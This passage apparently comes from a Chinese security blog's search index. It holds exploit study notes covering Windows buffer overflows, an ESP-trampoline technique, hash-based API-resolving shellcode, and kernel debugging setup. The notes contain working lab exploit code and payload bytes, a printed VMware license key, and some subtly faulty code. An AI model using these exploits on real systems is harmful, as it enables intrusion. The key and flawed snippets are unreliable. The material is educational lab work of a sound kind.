栈顶之上数据若有用，抬高栈顶保护它以便以后使用 调用API时有些寄存器总是被保存在栈中，但是大多数函数运行时不会使用EBP，因此可以用EBP保存数据 HASH算法存储API选择适当的HASH算法 8bit最多表示256个不同的字符，不可避免会有碰撞，但是如果所需函数位于碰撞的第一个，那么也可以使用 即碰撞是可以部分容忍的" }, { "title": "漏洞学习笔记-003-API动态加载", "url": "/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-003-API%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/", "categories": "Exploit", "tags": "Windows, Exploit", "date": "2020-10-19 20:20:00 +0800", "snippet": "ShellCode的API动态定位 点击此处下载本文附可执行程序，shellcode文件本文来源：Moeomu的博客通过TEB定位API地址定位Kernel32.dll 程序加载时，用户态下[FS:0]寄存器中存放TEB地址 TEB偏移0x30的位置[TEB + 0x30]存放PEB的地址 PEB偏移0xC的位置[PEB + 0xC]存放PEB_LDR_DATA 关于PEB_LDR_DATA结构，微软官方的说明点此，C语言表示如下typedef struct _PEB_LDR_DATA { BYTE Reserved1[8]; PVOID Reserved2[3]; LIST_ENTRY InMemoryOrderModuleList;} PEB_LDR_DATA, *PPEB_LDR_DATA; 以下是我的调试结果typedef struct _PEB_LDR_DATA { INT Length; UCHAR Initialized; PVOID SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID EntryInProgress; UCHAR ShutdownInProgress; PVOID ShutdownThreadId;} PEB_LDR_DATA, *PPEB_LDR_DATA; 我们需要读取InInitializationOrderModuleList(初始化加载模块列表)来取得Kernel32.dll的地址，而此列表是LIST_ENTRY结构，此结构的微软官方说明如下typedef struct _LIST_ENTRY { struct _LIST_ENTRY *Flink; struct _LIST_ENTRY *Blink;} LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY; 我的调试结果：typedef struct LinkNode{ _LIST_ENTRY Flink; _LIST_ENTRY Blink; PVOID DllAddress;} 由此可见，在链表节点的+0xC处存在DllAddress，而任何程序前三个节点均为Ntdll -&amp;gt; KernelBa -&amp;gt; Kernel32定位API地址(逆向Kernel32.dll) 上一小节获得了Kernel32的加载基址，此小节由此获取LoadLibrary和GetProcAddress的地址用于获取其它函数地址 偏移0x3C是PEHeader的入口，标志字为0x5045，文字为PE 再加上0x78的偏移是导出函数地址表的地址(Export Directory RVA)，此时的偏移为0x168，值为0x262C 再加上0x4的偏移是导出函数地址表的大小(Export Directory Size)，值是0x6CFD 在磁盘上时，节大小的最小单位是0x200，但加载到内存中，节大小的最小单位变为0x1000，而PE文件头在文件中占据的大小是0x400，但是映射到内存中将占据0x1000的大小，大小差值为0xC00，所以0x262C应当减去0xC00，得到导出目录表Export Directory的地址0x1A2C 在导出目录表的0x28偏移处是第一个导出函数的地址，序列号为0 在导出目录表的0x67C偏移处是函数GetProcAddress的地址，序列号为198 在导出目录表的0x340偏移处是函数LoadLibraryA的地址，序列号为244 至此，两个重要函数的地址找到了调试ShellCode(ExpStd0301)char shellcode[] = &quot;\\x10\\x10&quot;;void main(){ __asm { lea eax, shellcode push eax ret }}动态API加载ShellCode理论分析 需要的API函数 MessageBoxA(User32.dll) ExitProcess(Kernel32.dll) LoadLibraryA(Kernel32.dll) 一个难题：如何在需要ShellCode尽可能短的情况下(不存在函数名称)找到API的地址函数名的HASH算法理论 需要引入额外的HASH算法 计算的结果称为DIGEST(摘要) 对搜索到的函数名进行HASH算法(ExpStd0302)#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;windows.h&amp;gt;DWORD GetHash(char *fun_name){ DWORD digest = 0; while(*fun_name) { digest = ((digest &amp;lt;&amp;lt; 25) | (digest &amp;gt;&amp;gt; 7)); digest += *fun_name; fun_name++; } return digest;}void main(){ DWORD hash; hash = GetHash(&quot;MessageBoxA&quot;); printf(&quot;Hash is %s&quot;, hash);}最终ShellCode(ExpStd0303)int main(){ _asm{ ;flag nop nop nop nop nop cld ;clear flag DF ;store hash push 0x1e380a6a ;hash of MessageBoxA push 0x4fd18963 ;hash of ExitProcess push 0x0c917432 ;hash of LoadLibraryA mov esi, esp ;esi = addr of first func hash lea edi, [esi-0xc] ;edi = addr to start writing func ;make some stack space xor ebx, ebx mov bh, 0x04 sub esp, ebx ;push a pointer to &quot;user32&quot; onto stack mov bx, 0x3233 ;rest of ebx is null push ebx push 0x72657375 push esp xor edx, edx ;find base addr of kernel32.dll mov ebx, fs:[edx + 0x30] ;ebx = PEB address mov ecx, [ebx + 0x1c] ;ecx = loader data pointer mov ecx, [ecx + 0x1c] ;ecx = first entry in Initialization order list mov ecx, [ecx] ;ecx = second entry mov ebp, [ecx + 0x08] ;ebp = base address of kernel32.dll find_lib_functions: lodsd ;load next hash into al and increment esi cmp eax, 0x1e380a6a ;hash of MessageBoxA - trigger and LoadLibrary(&quot;user32&quot;) jne find_functions xchg eax, ebp ;save current hash call [edi - 0x8] ;LoadLibraryA xchg eax, ebp ;restore current hash and update ebp with base address of user32.dll find_functions: pushad ;preserve registers mov eax, [ebp + 0x3c] ;eax = start of PEheader mov ecx, [ebp + eax + 0x78];ecx = relative offset of export table add ecx, ebp ;ecx = absolute addr of export table mov ebx, [ecx + 0x20] ;ebx = relative offset of names add ebx, ebp ;ebx = absolute addr of names table xor edi, edi ;edi will count through the functions next_function_loop: inc edi ;inc function counter mov esi, [ebp + edi * 4] ;esi = relative offset of current function name add esi, ebp ;esi = absolute addr of current function name cdq ;dl will hold hash (we know eax is small) hash_loop: movsx eax, byte ptr[esi] cmp al, ah jz compare_hash ror edx, 7 add edx, eax inc esi jmp hash_loop compare_hash: cmp edx, [esp + 0x1c] ;compare to the requested hash(saved on stack from pushad) jnz next_function_loop mov ebx, [ecx + 0x24] ;ebx = relative offset of ordinals table add ebx, ebp ;ebx = absolute addr of ordinals table mov di, [ebx + 2 * edi] ;di = ordinal number of matched function mov ebx, [ecx + 0x1c] ;ebx = relative offset of address table mov ebx, ebp ;ebx = absolute addr of address table add ebp, [ebx + 4 * edi] ;add to ebp(base addr of module) the relative offset of matched function xchg eax, ebp ;move func addr into eax pop edi ;edi is last onto stack in pushad stosd ;write function addr to [edi] and increment edi push edi popad ;restore registers and loop until we reach end of alst hash cmp eax, 0x1e380a6a jne find_lib_functions function_call: xor ebx, ebx push ebx ;cut string push 0x74736577 push 0x6c696166 ;push failwest mov eax, esp ;load address of failwest push ebx push eax push eax push ebx call [edi - 0x4] ;call MessageBoxA push ebx call[edi - 0x8] ;call ExitProcess ;flag nop nop nop nop }}" }, { "title": "漏洞学习笔记-002-ESP跳板", "url": "/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-002-ESP%E8%B7%B3%E6%9D%BF/", "categories": "Exploit", "tags": "Windows, Exploit", "date": "2020-10-19 18:20:00 +0800", "snippet": "ShellCode的动态定位法-ESP跳板法 点击此处下载本文附可执行程序，shellcode文件本文来源：Moeomu的博客栈空间移位ShellCode在内存中往往是动态的，并非直接填写一个定值也就是前一篇中buffer数组的栈空间地址，并非总是个定值当CPU执行到此地址时，有可能触发无效指令异常导致程序崩溃，ShellCode无法运行原理从程序已加载的系统DLL中查找一个JMP ESP指令的地址，用此地址去淹没返回地址这样既能精准定位shellcode的位置，又能适应栈空间的动态变化栈的地址是上小下大，CPU的执行顺序是小地址到大地址，栈淹没同样从小地址淹没到大地址这样只要将前面的一段空间淹没为无意义数据，将ShellCode的开始恰好淹没在[ESP]处，就可以达到ShellCode动态寻址ShellCode编写结构无用数据+JMP ESP地址(此地址恰好淹没到函数返回地址)+命令代码(用于测试，MessageBox弹窗) 说明： retn后将会跳到JMP ESP处，随后ESP + 4 JMP ESP后将会正好跳到命令代码处 必要数据 JMP ESP地址：位于User32.dll中0x77D29353(没必要必须是原版命令，只要搜二进制0xFFE4即可) 垃圾数据大小：52 Byte = Buffer(44 Byte) + authenticated(4 Byte) + EBP(4 Byte)最终Code 以下是需要执行的命令代码33DB xor ebx,ebx53 push ebx68 6D756F6F push 0x6F6F756D68 4D6F656F push 0x6F656F4D8BC4 mov eax,esp53 push ebx50 push eax50 push eax53 push ebxB8 EA07D577 mov eax,user32.MessageBoxAFFD0 call eaxB8 FACA817C mov eax,kernel32.ExitProcessFFD0 call eax 最终的ShellCode34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 3134 33 32 31 34 33 32 31 34 33 32 31 34 33 32 3134 33 32 31 34 33 32 31 34 33 32 31 34 33 32 3134 33 32 31 53 93 D2 77 33 DB 53 68 6D 75 6F 6F68 4D 6F 65 6F 8B C4 53 50 50 53 B8 EA 07 D5 77FF D0 B8 FA CA 81 7C FF D0" }, { "title": "漏洞学习笔记-001-缓冲区溢出", "url": "/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-001-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/", "categories": "Exploit", "tags": "Windows, Exploit", "date": "2020-10-18 10:00:00 +0800", "snippet": " 能够引起软件做一些超出涉及范围的事情的bug叫做漏洞，本篇写了一些简单的缓冲区溢出漏洞的利用浅析 功能性逻辑缺陷(Bug) 安全性逻辑缺陷(Vulnerability) 点击此处下载本文附代码，可执行程序，shellcode文件本文来源：Moeomu的博客PE概念PE文件与虚拟内存之间的映射 ImageBase：装载基址，对(.EXE)是0x00400000，对(.DLL)是0x10000000 FileOffset：文件偏移地址 VirtualAddress：虚拟地址，是映射到内存中的地址 RelativeVirtualAddress：相对虚拟地址，是虚拟地址VA相对装载基址的偏移量 VA = ImageBase + RVA数据补全填充规则 在磁盘上时，PE文件的每个节(.section)是以0x200字节为单位存放，当节的大小不足0x200时，使用0x0补全，当节的大小超过0x200时，分配下一个0x200大小给此节 在内存中时，PE文件的每个节(.section)是以0x1000字节为单位存放，规则同上 SectionOffset = RVA - FileOffsetFileOffset = VA - ImageBase - SectionOffset = RVA - SectionOffset 例如.text节RVA=0x1000，FileOffset=0x400，则SectionOffset=0xC000x00404141处指令文件偏移为0x00404141-0x00400000-(0x1000-0x400)=0x3541函数调用约定   C SysCall StdCall BASIC FORTRAN PASCAL 参数入栈顺序 右-&amp;gt;左 右-&amp;gt;左 右-&amp;gt;左 左-&amp;gt;右 左-&amp;gt;右 左-&amp;gt;右 恢复栈平衡的位置 母函数 子函数 子函数 子函数 子函数 子函数 缓冲区溢出 栈帧相邻，局部变量相邻，若数组越界，则会覆盖局部变量，接着覆盖函数返回地址通过淹没栈帧返回地址值以控制程序流程ShellCodeExploit/ShellCode(Payload)的分工合作 Exploit的作用是精准利用某种漏洞，目标是劫持EIP ShellCode将执行恶意/善意代码，是攻击载荷 ShellCode一般是通用的，Exploit只能针对某个特定的漏洞工作实例本例使用简单的密码验证来测试漏洞缓冲区溢出控制程序Flag代码(ExpStd0101) 编译环境：Windows XP SP3, Visual C++ 6, Debug实验环境：Windows XP SP3#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#define PASSWORD &quot;1234567&quot;int verify_password(char *password){ int authenticated; char buffer[8]; authenticated = strcmp(password, PASSWORD); strcpy(buffer, password); return authenticated;}int main(){ int valid_flag = 0; char password[1024]; while(1) { printf(&quot;Input Number:&quot;); scanf(&quot;%s&quot;, password); valid_flag = verify_password(password); if(valid_flag) { printf(&quot;ERROR!&quot;); } else { printf(&quot;OK!&quot;); break; } }}分析(ExpStd0101) 简易分析 当输入99999999时，它的末尾&#39;\\0&#39;将第9个字节填充，正好将authenticated的最低位1个字节0x1改为0x0 这也和strcmp函数有关系，如果str1&amp;lt;str2那authenticated的值-1以反码FFFFFFFF存储，此时即使将低位FF溢出为00也无用，所以并非全部的8位字符都可以绕过验证 进一步验证 当输入8个9时，8字节的buffer填满，覆盖1字节的authenticated空间 当输入11个9时，8字节的buffer填满，覆盖4字节的authenticated空间，即authenticated被完全覆盖，它被冲刷为0x0039393939 当输入15个9时，8字节的buffer填满，覆盖4字节的authenticated空间，本函数EBP所在空间也被覆盖(内容是父函数EBP) 当输入19个9时，8字节的buffer填满，覆盖4字节的authenticated空间，覆盖4字节的EBP空间，覆盖4字节的返回地址 更进一步验证 由于键盘无法输入一些不可见字符，所以更换为读取文件验证 硬编码地址控制程序流程使用FILE来进行文件的读取代码(ExpStd0102) 编译环境：Windows XP SP3, Visual C++ 6, Debug实验环境：Windows XP SP3#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#define PASSWORD &quot;1234567&quot;int verify_password(char *password){ int authenticated; char buffer[8]; authenticated = strcmp(password, PASSWORD); strcpy(buffer, password); return authenticated;}int main(){ int valid_flag = 0; char password[1024]; FILE * fp; if(!(fp = fopen(&quot;password.txt&quot;, &quot;rw+&quot;))) { exit(0); } fscanf(fp, &quot;%s&quot;, password); valid_flag = verify_password(password); if(valid_flag) { printf(&quot;ERROR!&quot;); } else { printf(&quot;OK!&quot;); } fclose(fp);}分析(ExpStd0102) 首先使用已知的地址进行shellcode的编写，此地址不同编译器编译出的结果不同，不同系统加载的地址也不同，所以只能测试时使用 必要信息 成功分支地址：0x0040111F 由于内存逆序存放，应该逆序写这些值 十六进制编辑password.txt，如下34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 311F 11 40 00 运行程序，此时 在栈地址0x0012FB24处存放的事是函数verify_password的返回地址 此处已经被冲刷为0040111F，而此地址是成功分支地址 使用成功分支地址替代了返回地址，但是由于堆栈不平衡，所以程序显示成功后崩溃加入攻击载荷(ShellCode)加大了buffer的大小用来承载攻击载荷动态加载DLL用于调用API代码(ExpStd0103) 编译环境：Windows XP SP3, Visual C++ 6, Debug实验环境：Windows XP SP3#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;windows.h&amp;gt;#define PASSWORD &quot;1234567&quot;int verify_password(char *password){ int authenticated; char buffer[44]; authenticated = strcmp(password, PASSWORD); strcpy(buffer, password); return authenticated;}int main(){ int valid_flag = 0; char password[1024]; FILE * fp; LoadLibrary(&quot;user32.dll&quot;); if(!(fp = fopen(&quot;password.txt&quot;, &quot;rw+&quot;))) { exit(0); } fscanf(fp, &quot;%s&quot;, password); valid_flag = verify_password(password); if(valid_flag) { printf(&quot;ERROR!&quot;); } else { printf(&quot;OK!&quot;); } fclose(fp);}分析(ExpStd0103) 目标：在程序验证时植入代码，实现弹窗MessageBox 必要信息 数组起始地址：0x0012FAF0(也是ShellCode执行的起始地址) MessageBoxA地址：0x77D507EC 十六进制的文字：4D6F656F6D75(Moeomuoo) 组成的机器码 机器码(HEX) 汇编码 注释 33DB XOR EBX, EBX 清空EBX，保证ShellCode中无0(截至符) 53 PUSH EBX 字符串末尾的\\0 68 6D756F6F PUSH 6F6F756D 压入文字字节muoo(0x6D756F6F) 68 4D6F656F PUSH 6F656F4D 压入文字字节Moeo(0x4D6F656F) 8BC4 MOV EAX, ESP ESP栈顶指向字符串Moeomuoo，移交给EAX 53 PUSH EBX MB_OK 50 PUSH EAX Message 50 PUSH EAX Caption 53 PUSH EBX Handle B8 EC07D577 MOV EAX, 0x77D507EC 将MessageBoxA的地址硬编码移入EAX FFD0 CALL EAX 调用MessageBoxA 将机器码按照顺序写入password.txt 53-56字节填入返回地址(Buffer的起始地址)，其余字节用0x90填充 填充运行测试发现，最后只剩下2字节的空间可用，唯一不完美的地方在于程序崩溃退出 以下是最终的password.txt33 DB 53 68 6D 75 6F 6F 68 4D 6F 65 6F 8B C4 5350 50 53 B8 EC 07 D5 77 FF D0 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 F0 FA 12 00总结本文讨论了如何利用缓冲区溢出漏洞以及ShellCode的编写，但不足之处在于硬编码地址和栈空间移位的问题有关这些问题下一篇讨论" }, { "title": "Windows内核调试学习笔记-002-结构体", "url": "/posts/Windows%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-002-%E7%BB%93%E6%9E%84%E4%BD%93/", "categories": "Kernel", "tags": "Windows, Kernel", "date": "2020-10-17 20:23:00 +0800", "snippet": "Windows内核的相关的一些学习笔记，这一篇主要是描述EPROCESS，PEB的结构本文来源：Moeomu的博客非公开内核结构Windows的非公开结构非常多，而有些结构是半公开的，虽然有字段名，但只能推测其用意WinDbg能加载一些内核调试符号，在这些PDB文件中，有一些半公开结构的信息EPROCESS(KPEB)(Kernel Process Environment Block)每一个进程都由一个EPROCESS结构表示，而这些结构被一个双向链表所连接结构信息 0x000偏移是PCB(Process Control Block)的地址，它位于R0中 0x0b4偏移是PID，它是标识此进程的唯一标识符 0x0b8偏移是活动进程链表，可以用它遍历系统的所有EPROCESS结构结构组成 以下是此结构的详细内容kd&amp;gt; dt _eprocessnt!_EPROCESS +0x000 Pcb : _KPROCESS // 进程控制块 +0x098 ProcessLock : _EX_PUSH_LOCK // 进程锁 +0x0a0 CreateTime : _LARGE_INTEGER // 创建时间 +0x0a8 ExitTime : _LARGE_INTEGER // 退出时间 +0x0b0 RundownProtect : _EX_RUNDOWN_REF // 进程加保护 +0x0b4 UniqueProcessId : Ptr32 Void // PID +0x0b8 ActiveProcessLinks : _LIST_ENTRY // 活动进程链表 +0x0c0 ProcessQuotaUsage : [2] Uint4B // 物理页相关的统计信息 +0x0c8 ProcessQuotaPeak : [2] Uint4B // 物理页相关的统计信息 +0x0d0 CommitCharge : Uint4B +0x0d4 QuotaBlock : Ptr32 _EPROCESS_QUOTA_BLOCK +0x0d8 CpuQuotaBlock : Ptr32 _PS_CPU_QUOTA_BLOCK +0x0dc PeakVirtualSize : Uint4B // 虚拟内存池大小 +0x0e0 VirtualSize : Uint4B // 虚拟内存大小 +0x0e4 SessionProcessLinks : _LIST_ENTRY +0x0ec DebugPort : Ptr32 Void // 调试端口 +0x0f0 ExceptionPortData : Ptr32 Void +0x0f0 ExceptionPortValue : Uint4B +0x0f0 ExceptionPortState : Pos 0, 3 Bits +0x0f4 ObjectTable : Ptr32 _HANDLE_TABLE +0x0f8 Token : _EX_FAST_REF // 权限令牌的地址 +0x0fc WorkingSetPage : Uint4B +0x100 AddressCreationLock : _EX_PUSH_LOCK +0x104 RotateInProgress : Ptr32 _ETHREAD +0x108 ForkInProgress : Ptr32 _ETHREAD +0x10c HardwareTrigger : Uint4B +0x110 PhysicalVadRoot : Ptr32 _MM_AVL_TABLE +0x114 CloneRoot : Ptr32 Void +0x118 NumberOfPrivatePages : Uint4B +0x11c NumberOfLockedPages : Uint4B +0x120 Win32Process : Ptr32 Void +0x124 Job : Ptr32 _EJOB +0x128 SectionObject : Ptr32 Void +0x12c SectionBaseAddress : Ptr32 Void +0x130 Cookie : Uint4B +0x134 Spare8 : Uint4B +0x138 WorkingSetWatch : Ptr32 _PAGEFAULT_HISTORY +0x13c Win32WindowStation : Ptr32 Void +0x140 InheritedFromUniqueProcessId : Ptr32 Void +0x144 LdtInformation : Ptr32 Void +0x148 VdmObjects : Ptr32 Void +0x14c ConsoleHostProcess : Uint4B +0x150 DeviceMap : Ptr32 Void +0x154 EtwDataSource : Ptr32 Void +0x158 FreeTebHint : Ptr32 Void +0x160 PageDirectoryPte : _HARDWARE_PTE +0x160 Filler : Uint8B +0x168 Session : Ptr32 Void +0x16c ImageFileName : [15] UChar +0x17b PriorityClass : UChar +0x17c JobLinks : _LIST_ENTRY +0x184 LockedPagesList : Ptr32 Void +0x188 ThreadListHead : _LIST_ENTRY // ETHREAD结构链表头 +0x190 SecurityPort : Ptr32 Void +0x194 PaeTop : Ptr32 Void +0x198 ActiveThreads : Uint4B // 正在运行的线程数量 +0x19c ImagePathHash : Uint4B +0x1a0 DefaultHardErrorProcessing : Uint4B +0x1a4 LastThreadExitStatus : Int4B +0x1a8 Peb : Ptr32 _PEB // 进程环境块地址 +0x1ac PrefetchTrace : _EX_FAST_REF +0x1b0 ReadOperationCount : _LARGE_INTEGER +0x1b8 WriteOperationCount : _LARGE_INTEGER +0x1c0 OtherOperationCount : _LARGE_INTEGER +0x1c8 ReadTransferCount : _LARGE_INTEGER +0x1d0 WriteTransferCount : _LARGE_INTEGER +0x1d8 OtherTransferCount : _LARGE_INTEGER +0x1e0 CommitChargeLimit : Uint4B +0x1e4 CommitChargePeak : Uint4B +0x1e8 AweInfo : Ptr32 Void +0x1ec SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO +0x1f0 Vm : _MMSUPPORT +0x25c MmProcessLinks : _LIST_ENTRY +0x264 HighestUserAddress : Ptr32 Void +0x268 ModifiedPageCount : Uint4B +0x26c Flags2 : Uint4B +0x26c JobNotReallyActive : Pos 0, 1 Bit +0x26c AccountingFolded : Pos 1, 1 Bit +0x26c NewProcessReported : Pos 2, 1 Bit +0x26c ExitProcessReported : Pos 3, 1 Bit +0x26c ReportCommitChanges : Pos 4, 1 Bit +0x26c LastReportMemory : Pos 5, 1 Bit +0x26c ReportPhysicalPageChanges : Pos 6, 1 Bit +0x26c HandleTableRundown : Pos 7, 1 Bit +0x26c NeedsHandleRundown : Pos 8, 1 Bit +0x26c RefTraceEnabled : Pos 9, 1 Bit +0x26c NumaAware : Pos 10, 1 Bit +0x26c ProtectedProcess : Pos 11, 1 Bit +0x26c DefaultPagePriority : Pos 12, 3 Bits +0x26c PrimaryTokenFrozen : Pos 15, 1 Bit +0x26c ProcessVerifierTarget : Pos 16, 1 Bit +0x26c StackRandomizationDisabled : Pos 17, 1 Bit +0x26c AffinityPermanent : Pos 18, 1 Bit +0x26c AffinityUpdateEnable : Pos 19, 1 Bit +0x26c PropagateNode : Pos 20, 1 Bit +0x26c ExplicitAffinity : Pos 21, 1 Bit +0x270 Flags : Uint4B +0x270 CreateReported : Pos 0, 1 Bit +0x270 NoDebugInherit : Pos 1, 1 Bit +0x270 ProcessExiting : Pos 2, 1 Bit +0x270 ProcessDelete : Pos 3, 1 Bit +0x270 Wow64SplitPages : Pos 4, 1 Bit +0x270 VmDeleted : Pos 5, 1 Bit +0x270 OutswapEnabled : Pos 6, 1 Bit +0x270 Outswapped : Pos 7, 1 Bit +0x270 ForkFailed : Pos 8, 1 Bit +0x270 Wow64VaSpace4Gb : Pos 9, 1 Bit +0x270 AddressSpaceInitialized : Pos 10, 2 Bits +0x270 SetTimerResolution : Pos 12, 1 Bit +0x270 BreakOnTermination : Pos 13, 1 Bit +0x270 DeprioritizeViews : Pos 14, 1 Bit +0x270 WriteWatch : Pos 15, 1 Bit +0x270 ProcessInSession : Pos 16, 1 Bit +0x270 OverrideAddressSpace : Pos 17, 1 Bit +0x270 HasAddressSpace : Pos 18, 1 Bit +0x270 LaunchPrefetched : Pos 19, 1 Bit +0x270 InjectInpageErrors : Pos 20, 1 Bit +0x270 VmTopDown : Pos 21, 1 Bit +0x270 ImageNotifyDone : Pos 22, 1 Bit +0x270 PdeUpdateNeeded : Pos 23, 1 Bit +0x270 VdmAllowed : Pos 24, 1 Bit +0x270 CrossSessionCreate : Pos 25, 1 Bit +0x270 ProcessInserted : Pos 26, 1 Bit +0x270 DefaultIoPriority : Pos 27, 3 Bits +0x270 ProcessSelfDelete : Pos 30, 1 Bit +0x270 SetTimerResolutionLink : Pos 31, 1 Bit +0x274 ExitStatus : Int4B +0x278 VadRoot : _MM_AVL_TABLE +0x298 AlpcContext : _ALPC_PROCESS_CONTEXT +0x2a8 TimerResolutionLink : _LIST_ENTRY +0x2b0 RequestedTimerResolution : Uint4B +0x2b4 ActiveThreadsHighWatermark : Uint4B +0x2b8 SmallestTimerResolution : Uint4B +0x2bc TimerResolutionStackRecord : Ptr32 _PO_DIAG_STACK_RECORDPEB(Process Environment Block)此结构位于R3层，相对容易修改结构信息 0x002偏移是是否被调试的FLAG的位置，这个值在R3下即可被修改 0x068偏移此值平时是0，被调试时是0x70 0x018偏移是_HEAP结构的地址，此结构体内可以判断在偏移0x40=2和0x44=0时为非调试状态结构组成kd&amp;gt; dt _PEBnt!_PEB +0x000 InheritedAddressSpace : UChar +0x001 ReadImageFileExecOptions : UChar +0x002 BeingDebugged : UChar // 是否被调试 +0x003 BitField : UChar +0x003 ImageUsesLargePages : Pos 0, 1 Bit +0x003 IsProtectedProcess : Pos 1, 1 Bit +0x003 IsLegacyProcess : Pos 2, 1 Bit +0x003 IsImageDynamicallyRelocated : Pos 3, 1 Bit +0x003 SkipPatchingUser32Forwarders : Pos 4, 1 Bit +0x003 SpareBits : Pos 5, 3 Bits +0x004 Mutant : Ptr32 Void +0x008 ImageBaseAddress : Ptr32 Void +0x00c Ldr : Ptr32 _PEB_LDR_DATA // 进程装载的模块结构体 +0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS +0x014 SubSystemData : Ptr32 Void +0x018 ProcessHeap : _HEAP // 0x40=2&amp;amp;&amp;amp;0x44=0为非调试状态 +0x01c FastPebLock : Ptr32 _RTL_CRITICAL_SECTION +0x020 AtlThunkSListPtr : Ptr32 Void +0x024 IFEOKey : Ptr32 Void +0x028 CrossProcessFlags : Uint4B +0x028 ProcessInJob : Pos 0, 1 Bit +0x028 ProcessInitializing : Pos 1, 1 Bit +0x028 ProcessUsingVEH : Pos 2, 1 Bit +0x028 ProcessUsingVCH : Pos 3, 1 Bit +0x028 ProcessUsingFTH : Pos 4, 1 Bit +0x028 ReservedBits0 : Pos 5, 27 Bits +0x02c KernelCallbackTable : Ptr32 Void +0x02c UserSharedInfoPtr : Ptr32 Void +0x030 SystemReserved : [1] Uint4B +0x034 AtlThunkSListPtr32 : Uint4B +0x038 ApiSetMap : Ptr32 Void +0x03c TlsExpansionCounter : Uint4B +0x040 TlsBitmap : Ptr32 Void +0x044 TlsBitmapBits : [2] Uint4B +0x04c ReadOnlySharedMemoryBase : Ptr32 Void +0x050 HotpatchInformation : Ptr32 Void +0x054 ReadOnlyStaticServerData : Ptr32 Ptr32 Void +0x058 AnsiCodePageData : Ptr32 Void +0x05c OemCodePageData : Ptr32 Void +0x060 UnicodeCaseTableData : Ptr32 Void +0x064 NumberOfProcessors : Uint4B +0x068 NtGlobalFlag : Uint4B // 反调试用 +0x070 CriticalSectionTimeout : _LARGE_INTEGER +0x078 HeapSegmentReserve : Uint4B +0x07c HeapSegmentCommit : Uint4B +0x080 HeapDeCommitTotalFreeThreshold : Uint4B +0x084 HeapDeCommitFreeBlockThreshold : Uint4B +0x088 NumberOfHeaps : Uint4B +0x08c MaximumNumberOfHeaps : Uint4B +0x090 ProcessHeaps : Ptr32 Ptr32 Void +0x094 GdiSharedHandleTable : Ptr32 Void +0x098 ProcessStarterHelper : Ptr32 Void +0x09c GdiDCAttributeList : Uint4B +0x0a0 LoaderLock : Ptr32 _RTL_CRITICAL_SECTION +0x0a4 OSMajorVersion : Uint4B // 系统主版本号 +0x0a8 OSMinorVersion : Uint4B // 系统子版本号 +0x0ac OSBuildNumber : Uint2B // 系统构建版本号 +0x0ae OSCSDVersion : Uint2B +0x0b0 OSPlatformId : Uint4B +0x0b4 ImageSubsystem : Uint4B +0x0b8 ImageSubsystemMajorVersion : Uint4B +0x0bc ImageSubsystemMinorVersion : Uint4B +0x0c0 ActiveProcessAffinityMask : Uint4B +0x0c4 GdiHandleBuffer : [34] Uint4B +0x14c PostProcessInitRoutine : Ptr32 void +0x150 TlsExpansionBitmap : Ptr32 Void +0x154 TlsExpansionBitmapBits : [32] Uint4B +0x1d4 SessionId : Uint4B +0x1d8 AppCompatFlags : _ULARGE_INTEGER +0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER +0x1e8 pShimData : Ptr32 Void +0x1ec AppCompatInfo : Ptr32 Void +0x1f0 CSDVersion : _UNICODE_STRING +0x1f8 ActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA +0x1fc ProcessAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP +0x200 SystemDefaultActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA +0x204 SystemAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP +0x208 MinimumStackCommit : Uint4B +0x20c FlsCallback : Ptr32 _FLS_CALLBACK_INFO +0x210 FlsListHead : _LIST_ENTRY +0x218 FlsBitmap : Ptr32 Void +0x21c FlsBitmapBits : [4] Uint4B +0x22c FlsHighIndex : Uint4B +0x230 WerRegistrationData : Ptr32 Void +0x234 WerShipAssertPtr : Ptr32 Void +0x238 pContextData : Ptr32 Void +0x23c pImageHeaderHash : Ptr32 Void +0x240 TracingFlags : Uint4B +0x240 HeapTracingEnabled : Pos 0, 1 Bit +0x240 CritSecTracingEnabled : Pos 1, 1 Bit +0x240 SpareTracingBits : Pos 2, 30 Bits参考文档[1]Infosavvy.Understanding EProcess Structure[J/OL].2020-07-24" }, { "title": "Windows内核调试学习笔记-001-环境搭建", "url": "/posts/Windows%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-001-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/", "categories": "Kernel", "tags": "Windows, Kernel", "date": "2020-10-17 19:27:00 +0800", "snippet": "Windows内核的相关的一些学习笔记，这一篇主要是环境的搭建本文来源：Moeomu的博客下载工具 Windows 7 SP1 x86 镜像迅雷下载链接 VMWare Workstation 16(链接在下方) WinDbg Preview(Microsoft Store)安装Windows虚拟机 最初以Windows 7 SP1 x86为例子来学习 MSDN下载官方镜像 VMWare Workstation 16搭建虚拟环境 下载：VMWare 16 Link 密钥：ZF3R0-FHED2-M80TY-8QYGC-NPKYF 配置Windows内核调试虚拟机移除此虚拟机的打印机设备添加串行串口 点击使用命名的管道 